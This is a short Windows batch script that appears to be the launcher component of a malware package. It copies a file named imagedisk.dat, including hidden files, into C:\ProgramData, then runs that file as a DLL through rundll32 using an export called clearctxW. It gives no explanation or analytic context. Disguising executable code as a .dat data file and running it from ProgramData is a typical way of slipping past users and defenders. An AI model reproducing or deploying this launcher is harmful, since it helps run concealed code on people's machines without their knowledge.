@echo off
xcopy /H /y imagedisk.dat c:\programdata\
C:\Windows\System32\rundll32.exe C:\programdata\imagedisk.dat,clearctxW
exit